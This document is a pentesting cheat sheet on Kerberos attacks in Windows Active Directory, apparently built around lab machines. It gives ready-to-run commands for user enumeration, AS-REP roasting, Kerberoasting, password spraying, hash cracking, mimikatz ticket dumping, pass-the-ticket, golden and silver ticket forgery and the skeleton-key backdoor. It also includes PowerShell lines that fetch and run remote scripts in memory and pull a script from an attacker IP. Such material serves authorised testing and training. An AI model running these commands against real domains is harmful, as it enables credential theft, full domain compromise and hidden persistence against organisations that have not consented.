# Pentesting Kerberos

## What is Kerberos

* Kerberos is the default authentication service for Microsoft Windows domains.
* It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption.

## Basic Terms

* Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
* Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
* Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
* Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
* Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
* KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
* Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
* Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
* Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
* Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

## Kerberos Authentication Overview

* ![alt text](https://i.imgur.com/VRr2B6w.png)

### Kerberos Tickets Overview

* The most common type of ticket is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket.
* The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks.

## Attack Privilege Requirements

* Kerbrute Enumeration - No domain access required
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required
* Silver Ticket - Service hash required
* Skeleton Key - Full domain compromise (domain admin) required

## Enumeration with Kerbrute

* Add the domain name to `/etc/hosts`

### Abusing Pre-Authentication Overview -

* By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams.
* When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

### Kerbrute Installation

* Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases
* Rename kerbrute\_linux\_amd64 to kerbrute
* `chmod +x kerbrute` - make kerbrute executable

### Enumerating Users w/ Kerbrute -

* Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.
* `cd` into the directory that you put `Kerbrute`
* Download the wordlist to enumerate with (in this repo)

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt 
```

* This will brute force user accounts from a domain controller using a supplied wordlist
* ![1](https://user-images.githubusercontent.com/75596877/130246484-1b4fdb60-eb89-441b-b0c7-c1b06277c074.png)

#### Enumerate Users Metasploit

```
auxiliary/gather/kerberos_enumusers
```

## AS-REP Roasting&#x20;

* AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
* Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
* There are other tools out as well for AS-REP Roasting such as `kekeo` and Impacket's `GetNPUsers.py`

### AS-REP Roasting Overview

* During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request.
* After validating the timestamp the KDC will then issue a TGT for the user.
* If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

### Dumping KRBASREP5 Hashes with Rubeus (local)

* `cd Downloads` - navigate to the directory Rubeus is in
* This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

```
Rubeus.exe asreproast
```

#### Crack those Hashes with hashcat

* Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
* Insert `23$` after `$krb5asrep$` so that the first line will be $krb5asrep$23$User.....
* Crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200

```
hashcat -m 18200 hash.txt Pass.txt
```

### AS-REP Roasting with Impacket (remote)

* This attack takes advantage of users that have `UF_DONT_REQUIRE_PREAUTH` set.  This will allow us to steal their `$krb` hash, which once cracked will allow remote authentication via rdp winrm, smb etc.

```
sudo python /opt/impacket/examples/GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -usersfile /home/kali/Documents/htb/forest/loot/user.txt
#output
Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:12a052338596b97da3d3a45db829b01d$f6a2d6438e7afec40f4a6a8c798dd5489953e91c742248dba6d8549d8b0adde9e9d655fc58653d9c66c618139e51c4e30bf2639c867f96803118c9f08c7e7f09c21b817cdb495dd57715f501d0ca3d7aebe61f9fda4e8b31232516cfd1c2237278e3e0de31d180042bc2a588d907b1001b24657350683f005d6db20fdaac5e06412c1a90ef75e5f962254fcc9e3094e0396d354f0c17211ea081d13b1c822366ef2c256d39572872d38d475c934f322b75129bdf05cc737a555446ee62265c22cb6e92ea890ec23da455e5fb715d0ac8db5630e85a2bef7210b5e59555073a0dcbd8cc1118fc
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 
```

```
sudo python /opt/impacket/examples/GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161
Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation
Password: 
[*] Cannot authenticate svc-alfresco, getting its TGT $krb5asrep$23$svc-alfresco@HTB.LOCAL:1d6d0d121b56b32b2b13b689da2a8893$c01bfb3b9d3b472411c8897fe6557997d08bf5c8bb31c07a7a5370aebd2a99a7684434d8e8e50105e855cf3e7d4c80c4dabada3416fd9c6cc38cc0775c7e627f3828a044fe6441985b65210356304fa90bbd4a3c33fd969f03eeee745f299678ecdeb759add7a6afd46713f7f44e3118bdc74f44d37f891b6c899e46858f93c830470148ac49af820d007628513cf72b86f568072d0dc7c7d2f25b11bbc223168d05050133865ba1aedfe8e4c1bd24fefe599f20be7faf48b3306afb5345988b9de69f1760b14575f5cdf0814d8f8fc087aba7959fdeceffc2edc492cca735d09c9b0ee6f0c9Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
```

* In the second example when it asks for a password, just hit enter

## Rubeus

* This command tells Rubeus to harvest for TGTs every 30 seconds

```
Rubeus.exe harvest /interval:30
```

* ![alt text](https://i.imgur.com/VCeyyn9.png)

### Brute-Forcing and Password-Spraying with Rubeus

* Rubeus can both brute force passwords as well as password spray user accounts
* This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket.
* Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file.
* You can add the IP and domain name to the hosts file from the machine by using the echo command:

```
echo 10.10.121.111 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

* This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

```
Rubeus.exe brute /password:Password1 /noticket 
```

* ![alt text](https://i.imgur.com/WN4zVo5.png)
* Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

## Kerberoasting with Rubeus and Impacket

* Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.
* If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.
* To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts.
* It will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.

### Kerberoasting with Rubeus

* This will dump the Kerberos hash of any kerberoastable users

```
Rubeus.exe kerberoast
```

* Copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

### Kerberoasting with Impacket

#### Impacket Installation

* Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
* `cd /opt` navigate to your preferred directory to save tools in
* Download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket\_0\_9\_19
* `cd Impacket-0.9.19` navigate to the impacket directory
* `pip install .` - this will install all needed dependencies

### Kerberoasting w/ Impacket -

* Navigate to where GetUserSPNs.py is located

```
cd /usr/share/doc/python3-impacket/examples/ 
```

* This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

```
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.121.111 -request
└─$ sudo python3 GetUserSPNs.py htb.local/svc-alfresco:s3rvice -dc-ip 10.10.10.161 -request

```

* Now crack that hash

```
hashcat -m 13100 -a 0 hash.txt Pass.txt 
```

* Once cracked to show the password

```
hashcat -m 13100 -a 0 /tmp/http1.txt Pass.txt --show
```

## Pass the Ticket with mimikatz

### Pass the Ticket Overview

* Pass the ticket works by dumping the TGT from the LSASS memory of the machine.
* The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided.
* You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes.
* When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.
* This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets
* ![alt text](https://i.imgur.com/V6SOlll.png)

### Prepare Mimikatz & Dump Tickets

* You will need to run the command prompt as an administrator

```
mimikatz.exe
privilege::debug
```

* Ensure this outputs `[output '20' OK]`
* This will export all of the .kirbi tickets into the directory that you are currently in

```
sekurlsa::tickets /export
```

* When looking for which ticket to impersonate I would recommend looking for an administrator ticket

### Pass the Ticket with Mimikatz

* We can now perform a pass the ticket attack to gain domain admin privileges.
* Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

```
kerberos::ptt <ticket>
```

* ![alt text](https://i.imgur.com/DwXmm8Z.png)
* Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

```
klist
```

## Golden and Silver Ticket Attacks with mimikatz

* A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet.
* The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
* A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server.

### KRBTGT Overview

* A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients.
* If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want.
* A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

### Golden and Silver Ticket Attack Overview

* A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket.
* This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash

### Dump the krbtgt hash

* ![alt text](https://i.imgur.com/VOEsU4O.png)

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

* Above will dump the hash as well as the security identifier needed to create a Golden Ticket.
* To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

### Create a Golden or Silver Ticket

```
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
```

* Simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
* ![alt text](https://i.imgur.com/rh06qDl.png)
* This will open a new elevated command prompt with the given ticket in mimikatz.

```
misc::cmd
```

* Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from.
* However if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket.
* However, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
* ![alt text](https://i.imgur.com/BSh4rXy.png)

## Kerberos Backdoors with mimikatz

* A Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.
* The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps.
* A skeleton key only works using Kerberos RC4 encryption.
* The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password -`"mimikatz"`

### Skeleton Key Overview

* The timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash.
* Once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

```
mimikatz.exe
privilege::debug
misc::skeleton
```

* ![alt text](https://i.imgur.com/wI802gw.png)

### Accessing the forest

* The default credentials will be: `mimikatz`
* The share will now be accessible without the need for the Administrators password

```
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 
```

* Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

```
dir \\Desktop-1\c$ /user:Machine1 mimikatz 
```

* The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques

### Service Principle Name SPN

* Lets first enumerate Windows. If we run

```
setspn -T medin -Q */* 
```

* We can extract all accounts in the SPN. SPN is the Service Principal Name, and is the mapping between service and account.
* Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
* Lets first get the Powershell Invoke-Kerberoast script.

```
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
powershell Invoke-WebRequest -Uri http://10.13.22.22:8000/Invoke-Kerberoast.ps1 -OutFile C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1
```

* Now lets load this into memory:

```
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat |fl
```

* You should get a SPN ticket.
* Crack with hashcat

```
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## Priv Esc

* We will run PowerUp.ps1 for the enumeration.
* Lets load PowerUp1.ps1 into memory.

```
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
```

* Load into memory

```
. .\PowerUp.ps1
Invoke-AllChecks
```

* Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode."

It is also where users passwords are stored in base64. Navigate to:

```
C:\Windows\Panther\Unattend\Unattended.xml.
```

### Resources

* https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
* https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
* https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
* https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
* https://www.varonis.com/blog/kerberos-authentication-explained/
* https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
* https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
* https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
